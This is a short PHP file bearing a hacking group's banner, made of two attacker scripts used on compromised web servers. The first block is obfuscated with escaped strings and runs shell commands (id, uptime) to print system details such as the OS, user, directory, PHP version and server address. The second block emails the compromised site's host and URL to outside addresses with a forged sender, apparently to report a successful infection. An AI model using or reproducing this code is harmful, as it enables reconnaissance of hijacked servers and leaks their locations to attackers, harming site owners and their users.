<? 

/*******************************************\
 IRC.ASCNET.BIZ  
 http://www.asc.sh/        
 ALBOSS PARADISE aka ASCRIMEZ aka ASCNET aka ASC aka ALBANIAN.SECURITY.CLAN 
\*******************************************/

 $x16="\147\145t_\143\x75\162r\x65n\x74\137\x75\x73\x65\x72"; $x17="\x67e\164\x63\x77d"; $x18="\x67e\164e\x6ev"; $x19="\x67\145\164\150ostby\x6e\x61\x6de"; $x1a="\160hp\137\x75\156\x61\155e"; $x1b="\x70\x68\160\x76\x65\x72s\x69\157\156"; $x1c="\x73y\163\x74\x65\155"; 
echo "\x41\114\x42\101\x4e\x49A\074b\162\076";$x0b = @$x1a();$x0c = $x1c(uptime);$x0d = $x1c(id);$x0e = @$x17();$x0f = $x18("SE\122\x56\x45\122\x5f\123O\106T\x57AR\x45");$x10 = $x1b();$x11 = $_SERVER['SERVER_NAME'];$x12 = $x19($x13);$x14 = $x16();$x15 = @PHP_OS;echo "\157s\x3a\040$x15\x3c\142r\076";echo "\x75n\141\155\145 -\x61: $x0b\x3c\x62r>";echo "\x75\160\164\x69\x6d\x65\x3a\x20$x0c\x3c\142\x72\x3e";echo "\151d\x3a $x0d\x3cb\162\x3e";echo "\160\167\x64:\040$x0e\x3c\142r\076";echo "\x75\x73\145\162: $x14<\x62\162>";echo "p\x68\x70v:\040$x10<b\162>";echo "\x53\x6fft\x57\x61\162\145\x3a\040$x0f\074\142r\x3e";echo "\x53\x65r\166\x65\x72\116\x61\155\x65:\x20$x11\x3c\x62r>";echo "S\145\x72\x76\145r\101\x64\x64\x72\x3a\040$x12<b\x72>";echo "\x55\116I\x54\x45\x44 \101\114\102\x41\x4eIA\116\x53\040\x61\x6b\x61 \x41\x4c\x42\x4f\x53S\040\120\x41R\101D\111\x53E<b\162>";?>
<?php
//=================================
//
//    scan - [KrattOs] - inb0x hotmail v1.0
//
//  
//      
//
//
//     priv8 file
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "God Of Waar";
 $email1 = "faq.kingx@msn.com,vulldokingx@gmail.com";
 $headers .= "From:TIM.com.br<$email>\r\n";
 $html = '<html>
<head>BlackBrier:        


';

$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1";

 if(mail($email1, $assunto, $html . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "N&#227;o enviei..";
 exit();
 }
?>